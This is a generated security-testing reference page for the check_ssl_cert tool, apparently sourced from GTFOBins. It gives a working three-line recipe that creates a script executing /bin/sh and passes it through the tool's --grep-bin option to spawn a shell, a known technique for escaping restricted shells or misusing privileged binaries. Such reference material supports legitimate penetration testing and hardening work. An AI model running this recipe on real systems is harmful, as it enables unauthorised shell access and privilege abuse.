---
parsed_by: focuslocust
source: commands
type: generated
---
# check_ssl_cert Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## check_ssl_cert

Tool page: [check_ssl_cert](../../tools/linux/check-ssl-cert.md)

### shell

```text
echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
chmod +x /path/to/temp-file
check_ssl_cert --grep-bin /path/to/temp-file -H x
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/check_ssl_cert` |
| Evidence | Function example preserved from source parser. |
